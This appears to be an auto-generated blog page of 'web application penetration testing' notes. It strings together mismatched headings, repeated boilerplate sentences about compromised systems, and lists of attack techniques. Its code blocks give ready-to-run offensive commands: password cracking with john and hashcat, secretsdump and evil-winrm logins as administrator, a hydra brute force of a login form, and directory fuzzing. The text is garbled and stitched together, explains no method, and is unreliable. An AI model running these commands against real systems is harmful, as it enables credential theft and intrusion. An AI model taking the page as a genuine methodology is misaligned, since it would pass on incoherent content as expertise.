---
TitleSEO: "Web Application Penetration Testing Methodology | ZureFX"
TitlePost: "Web Application Penetration Testing Methodology"
Author: "ZureFX"
Description: "Personal notes on Web Application Penetration Testing Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, malware, privilege escalation, lateral movement"
URL: "https://zurefx.github.io/notes/note-web-application-penetration-testing-meth-965.html"
URL_IMAGES: ""
Date: "2025-07-10"
Tags: "DFIR, Malware, Privilege Escalation, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-web-application-penetration-testing-meth-965"
Permalink: "/notes/note-web-application-penetration-testing-meth-965.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SeDebugPrivilege

### john

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

- `socat`
- `john`
- `hydra`
- `Pass the Hash`

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
nmap -sCV -p3268,445,5986 10.41.58.212 -oN scan.txt
```

- `dcomexec`
- `SUID Binary`
- `SSTI`
- `CSRF`
- `kerbrute`
- `AlwaysInstallElevated`

- `DLL Hijacking`
- `nmap`
- `SeDebugPrivilege`
- `Remote Code Execution`
- `LXD Privilege Escalation`

## gobuster

### rpcclient

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.60.200.39
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.54.141.197 -u administrator -p 'P@ssw0rd!'
```

## GPP Password

### FTP

- `Insecure Deserialization`
- `Writable PATH`
- `msfvenom`
- `Resource-Based Constrained Delegation`
- `GetUserSPNs`

> **Note:** SSTI was identified as the primary attack vector in this scenario.

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

## PHP

### POP3

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

```bash
gobuster dir -u http://10.104.145.178/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.46.170.199 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.72.174.98/FUZZ
```

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
gobuster dir -u http://10.118.184.185/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.127.68 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.
